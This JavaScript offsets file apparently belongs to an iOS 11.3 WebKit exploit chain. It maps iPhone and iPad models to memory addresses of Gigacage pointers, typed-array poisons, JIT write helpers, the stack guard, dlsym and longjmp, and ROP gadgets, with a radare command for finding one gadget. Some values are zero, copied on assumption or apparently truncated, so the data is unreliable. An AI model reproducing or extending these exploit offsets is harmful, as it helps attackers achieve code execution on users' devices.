/*
    To find ModelIO popx8:
    Use radare: "/c ldr x8, [sp, 0x28]; ldr x0, [x8, 0x18]; ldp x29, x30, [sp, 0x50]; add sp, sp, 0x60; ret"
*/

var Offsets = function Offsets(sw_vers, productname) {
    
    var offsets = [];
    
    //iPhones
    offsets["iPhone 2G"] = [];
    offsets["iPhone 3G"] = [];
    offsets["iPhone 3GS"] = [];
    offsets["iPhone 4"] = [];
    offsets["iPhone 4S"] = [];
    offsets["iPhone 5"] = [];
    offsets["iPhone 5C"] = [];
    offsets["iPhone 5S"] = [];
    offsets["iPhone 6"] = [];
    offsets["iPhone 6+"] = [];
    offsets["iPhone 6S"] = [];
    offsets["iPhone 6S+"] = [];
    offsets["iPhone 7"] = [];
    offsets["iPhone 7+"] = [];
    offsets["iPhone 8"] = [];
    offsets["iPhone 8+"] = [];
    offsets["iPhone X"] = [];
    
    //iPads
    offsets["iPad Air"] = [];
    
    //iPad Air
    offsets["iPad Air"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b2b99698,
        g_gigacagebaseptrs: 0x1b1624000,
        g_typedarraypoisons: 0x1b2b99720,
        longjmp: 0x180b12778,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b2b990b8,
        endfixedmempool: 0x1b2b990c0,
        jit_writeseperateheaps_func: 0x1b2b990c8,
        usefastpermissions_jitcopy: 0x1b1620018,
        ptr_stack_check_guard: 0x1b2af3ef8,
        modelio_popx8: 0x18D2F6574,
        coreaudio_popx2: 0x18409DDCC,
        linkcode_gadget: 0x187BD12C0
    };
    
    //iPhone 5S
    offsets["iPhone 5S"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b3199698,
        g_gigacagebaseptrs: 0x1b1bec000,
        g_typedarraypoisons: 0x1b3199720,
        longjmp: 0x180b12778,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b31990b8,
        endfixedmempool: 0x1b31990c0,
        jit_writeseperateheaps_func: 0x1b31990c8,
        usefastpermissions_jitcopy: 0x1b1be8018,
        ptr_stack_check_guard: 0x1b30f1ef8,
        modelio_popx8: 0,
        coreaudio_popx2: 0,
        linkcode_gadget: 0
    };

    //iPhone 6
    offsets["iPhone 6"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b31a1698,
        g_gigacagebaseptrs: 0x1b1bf4000,
        g_typedarraypoisons: 0x1b31a1720,
        longjmp: 0x180b12778,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b31a10b8,
        endfixedmempool: 0x1b31a10c0,
        jit_writeseperateheaps_func: 0x1b31a10c8,
        usefastpermissions_jitcopy: 0x1b1bf0018,
        ptr_stack_check_guard: 0x1b30f9ef8,
        modelio_popx8: 0,
        coreaudio_popx2: 0,
        linkcode_gadget: 0
    };
    
    //iPhone 6+
    offsets["iPhone 6+"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0,
        g_gigacagebaseptrs: 0x1b1bf4000,
        g_typedarraypoisons: 0x1b31a1720,
        longjmp: 0x180b12778,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b31a10b8,
        endfixedmempool: 0x1b31a10c0,
        jit_writeseperateheaps_func: 0x1b31a10c8,
        usefastpermissions_jitcopy: 0x1b1bf0018,
        ptr_stack_check_guard: 0x1b30f9ef8,
        modelio_popx8: 0,
        coreaudio_popx2: 0,
        linkcode_gadget: 0
    };
    
    //iPhone 6S
    offsets["iPhone 6S"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b3247d28,
        g_gigacagebaseptrs: 0x1b1bf4000,
        g_typedarraypoisons: 0x1b31a1720,
        longjmp: 0x180b126e8,
        dlsym: 0x18851d090,
        startfixedmempool: 0x1b31a10b8,
        endfixedmempool: 0x1b31a10c0,
        jit_writeseperateheaps_func: 0x1b31a10c8,
        usefastpermissions_jitcopy: 0x1b1bf0018,
        ptr_stack_check_guard: 0x1b30f9ef8,
        modelio_popx8: 0x18d2f6574,
        coreaudio_popx2: 0x18409ddcc,
        linkcode_gadget: 0x187bd12c0
    };
    
    //iPhone 6S+
    offsets["iPhone 6S+"][11.31] = offsets["iPhone 6S"][11.31];
    
    //iPhone 7
    offsets["iPhone 7"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        g_gigacagebaseptrs: 0x1b1d08000,
        g_typedarraypoisons: 0x1b335d720,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b335d0b8,
        endfixedmempool: 0x1b335d0c0,
        jit_writeseperateheaps_func: 0x1b335d0c8,
        usefastpermissions_jitcopy: 0x1b1d04018,
        ptr_stack_check_guard: 0x1b32b7ef8,
        dlsym: 0x182c12f90, //Calling dlsym up yourself produces a differnet value, don't know why
        longjmp: 0x180b12778,
        callbacks: 0x1b335d698,
        modelio_popx8: 0, 
        coreaudio_popx2: 0,
        linkcode_gadget: 0 //Offsets taken from 11.3 should be the same, right?
    };
    
    //iPhone 7+
    offsets["iPhone 7+"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        g_gigacagebaseptrs: 0x1b1d08000,
        g_typedarraypoisons: 0x1b335d720,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b335d0b8,
        endfixedmempool: 0x1b335d0c0,
        jit_writeseperateheaps_func: 0x1b335d0c8,
        usefastpermissions_jitcopy: 0x1b1d04018,
        ptr_stack_check_guard: 0x1b32b7ef8,
        dlsym: 0x18084ef90,
        longjmp: 0x180b12778,
        callbacks: 0x1b335d698,
        modelio_popx8: 0, 
        coreaudio_popx2: 0,
        linkcode_gadget: 0
    };
    
    //iPhone 8
    offsets["iPhone 8"][11.31] = {
        padding: 0x20,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b335bd28,
        g_gigacagebaseptrs: 0x1b1d08000,
        g_typedarraypoisons: 0x1b335d720,
        longjmp: 0x180b126e8,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b335d0b8,
        endfixedmempool: 0x1b335d0c0,
        jit_writeseperateheaps_func: 0x1b335d0c8,
        usefastpermissions_jitcopy: 0x1b1d04018,
        ptr_stack_check_guard: 0x1ac3efc40,
        modelio_popx8: 0x18d2f6564,
        coreaudio_popx2: 0x18409ddbc,
        linkcode_gadget: 0x187bd18c8
    };
    
    //iPhone 8+
    offsets["iPhone 8+"][11.31] = {
        padding: 0x20,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b335d698,
        g_gigacagebaseptrs: 0x1b1d08000,
        g_typedarraypoisons: 0x1b335d720,
        longjmp: 0x180b1278,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b335d0b8,
        endfixedmempool: 0x1b335d0c0,
        jit_writeseperateheaps_func: 0x1b335d0c8,
        usefastpermissions_jitcopy: 0x1b1d04018,
        ptr_stack_check_guard: 0x1b32b7ef8,
        
        //Asuming these are correct, just copied from the i8
        modelio_popx8: 0x18d2f6564,
        coreaudio_popx2: 0x18409ddbc,
        linkcode_gadget: 0x187bd18c8
    };
    
    //iPhone X
    offsets["iPhone X"][11.31] = {
        padding: 0x20,
        disableprimitivegigacage: 0x18851a7d4,
        g_gigacagebaseptrs: 0x1b1cb0000,
        g_typedarraypoisons: 0x1b3281720,
        startfixedmempool: 0x1b32810b8,
        endfixedmempool: 0x1b32810c0,
        jit_writeseperateheaps_func: 0x1b32810c8,
        usefastpermissions_jitcopy: 0x1b1cac018,
        ptr_stack_check_guard: 0x1b31dcef8,
        dlsym: 0x18084ef90,
        longjmp: 0x180b12778,
        callbacks: 0x1b3281698,
        modelio_popx8: 0,
        coreaudio_popx2: 0,
        linkcode_gadget: 0,
        vtable: 0
    };
    
    //fixing up offsets that are the same accross devices, without having to allocate more memory for them.
    offsets["iPhone 5S"][11.3] = offsets["iPhone 5S"][11.31];
    offsets["iPhone 6"][11.3] = offsets["iPhone 6"][11.31];
    offsets["iPhone 6+"][11.3] = offsets["iPhone 6+"][11.31];
    offsets["iPhone 6S"][11.3] = offsets["iPhone 6S"][11.31];
    offsets["iPhone 6S+"][11.3] = offsets["iPhone 6S"][11.31];
    offsets["iPhone 7"][11.3] = offsets["iPhone 7"][11.31];
    offsets["iPhone 7+"][11.3] = offsets["iPhone 7+"][11.31];
    offsets["iPhone 8"][11.3] = offsets["iPhone 8"][11.31];
    offsets["iPhone 8+"][11.3] = offsets["iPhone 8+"][11.31];
    offsets["iPhone X"][11.3] = offsets["iPhone X"][11.31];
    
    offsets["iPad Air"][11.3] = offsets["iPad Air"][11.31];
    
    if(offsets[productname] !== undefined) {
        if(offsets[productname][sw_vers] !== undefined) {
            return offsets[productname][sw_vers];
        }
    }
    return false;
};
